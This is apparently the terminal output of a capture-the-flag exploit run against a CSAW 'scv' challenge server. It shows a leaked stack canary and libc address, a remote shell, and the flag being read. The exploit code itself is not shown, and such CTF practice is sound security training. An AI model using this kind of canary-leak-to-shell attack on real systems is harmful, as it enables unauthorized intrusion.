```bash
➜  scv git:(master) ✗ python exploit.py
[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
Exploit?
Leaked cookie: 0xa7696fb1c396f00
Leaked address: 0x7f693dad6830
[*] Switching to interactive mode
[*]BYE ~ TIME TO MINE MIENRALS...
$ id
uid=1000(scv) gid=1000(scv) groups=1000(scv)
$ whoami
scv
$ ls
flag
scv
$ cat flag
flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwn.chal.csaw.io port 3764
➜  scv git:(master) ✗ 
```
